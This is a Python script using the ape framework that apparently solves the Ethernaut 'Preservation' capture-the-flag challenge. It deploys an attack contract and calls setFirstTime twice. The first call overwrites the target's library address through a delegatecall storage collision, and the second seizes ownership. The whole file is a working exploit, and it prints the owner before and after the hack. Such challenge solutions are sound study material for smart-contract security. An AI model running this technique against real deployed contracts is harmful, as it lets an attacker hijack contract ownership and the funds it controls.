#!/usr/bin/python3
from ape import accounts, project
from rich.console import Console

ADDRESS = "0xbe402e8cFda1123e68c432fffc3251dbC98ae8Cc"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.Preservation.at(ADDRESS)

    console.print(f"[green]Owner Before The Hack: [magenta]{target_contract.owner()}")
    attacking_contract = project.Attack.deploy(sender=attacker)

    target_contract.setFirstTime(attacking_contract.address, sender=attacker)
    target_contract.setFirstTime(1337, sender=attacker)

    console.print(f"[green]Owner After The Hack: [magenta]{target_contract.owner()}")

    assert target_contract.owner() == attacker.address



def main():
    attack()


if __name__ == "__main__":
    main()